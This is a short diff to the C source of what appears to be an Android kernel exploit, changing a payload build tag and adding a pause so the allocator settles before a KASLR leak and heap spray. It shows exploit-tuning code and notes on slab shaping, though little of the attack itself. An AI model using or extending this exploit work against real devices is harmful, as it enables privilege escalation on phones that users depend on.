@@ -647,8 +647,8 @@ int run_exploit(int argc, char **argv) {
   set_limit();
   log_startup_context();
   init_ashmem_path();
-  pr_info("payload build tag v1.2.10-quietheap (waker at gates only, "
-          "widen-restore masks)\n");
+  pr_info("payload build tag v1.2.11-guardsettle (boot-scoped writer guard, "
+          "post-waker settle)\n");
 
 #if defined(RMG_PIN_TEST_PRIME)
   /* Stability gate (2026-08-27, rounds 4-5): the attempt requires a
@@ -684,8 +684,11 @@ int run_exploit(int argc, char **argv) {
    * retire the crew so the kaslr leak / heap spray run on a quiet
    * device (their feng shui is load-sensitive). The pinned main thread
    * keeps CORE busy; the consumer core is re-validated (and the crew
-   * respawned) at the pre-page gate. */
+   * respawned) at the pre-page gate. Settle afterwards: the crew's
+   * fork/exit churn dumps kernel stacks + task_structs into the very
+   * slabs the spray shapes — give the allocator a moment to drain. */
   rmg_waker_stop();
+  sleep(3);
 #else
   pin_to_core(CORE);
 #endif
